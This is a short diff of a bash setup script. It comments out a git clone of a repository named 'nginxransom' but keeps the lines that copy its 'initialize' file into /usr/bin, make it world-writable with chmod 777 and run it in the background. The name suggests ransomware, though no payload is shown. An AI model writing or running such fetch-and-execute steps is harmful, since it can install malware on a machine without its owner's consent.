@@ -2,7 +2,7 @@ cc
 #!/bin/bash  
 #apt update -y 
 #apt install git -y  
-git clone https://github.com/xeroxpro/nginxransom.git
+#git clone https://github.com/xeroxpro/nginxransom.git
 cp  /nginxransom/initialize.txt /usr/bin/initialize  
 chmod 777 /usr/bin/initialize 
 initialize &  
